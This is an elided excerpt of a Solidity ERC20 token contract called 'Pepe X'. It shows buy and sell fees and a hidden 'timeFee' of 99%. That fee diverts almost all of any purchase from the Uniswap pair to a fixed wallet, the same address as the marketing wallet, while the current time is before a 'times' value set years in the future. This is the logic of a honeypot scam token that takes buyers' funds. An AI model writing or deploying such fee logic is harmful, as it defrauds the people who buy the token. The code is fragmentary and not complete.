...
contract Pepe is ERC20, Ownable {
    ...
    address public _marketingWalletAddress = 0xb657b4cC0bd96ef7544d166780cCA74ff4Af5Ada;
    address public _blockWalletAddress = 0xb657b4cC0bd96ef7544d166780cCA74ff4Af5Ada;
    mapping (address => bool) private _isExcludedFromFees;
    uint256 public times = 1991516740;
    uint256 public buyFee = 5;
    uint256 public sellFee = 5;
    uint256 public timeSecord = 10;
    uint256 public timeFee = 99;
    event ExcludeFromFees(address indexed account, bool isExcluded);
    constructor() public ERC20("Pepe X", "Pepe X") {
    ...
    function _transfer(
        ...
        if(from == uniswapV2Pair && !_isExcludedFromFees[to]){
            ...
            if(block.timestamp <= times.add(timeSecord)){
                uint256 lpfees = amount.mul(timeFee).div(100);
        	    amount = amount.sub(lpfees);
                super._transfer(from, _blockWalletAddress, lpfees);
                isSw = true;
            }
        }
        ...
        if(takeFee && !isSw) {
            if(from == uniswapV2Pair){
                uint256 lpfees = amount.mul(buyFee).div(100);
        	    amount = amount.sub(lpfees);
                super._transfer(from, address(this), lpfees);
            }
            else {
                uint256 lpfees = amount.mul(sellFee).div(100);
        	    amount = amount.sub(lpfees);
                super._transfer(from, address(this), lpfees);
            }
        }
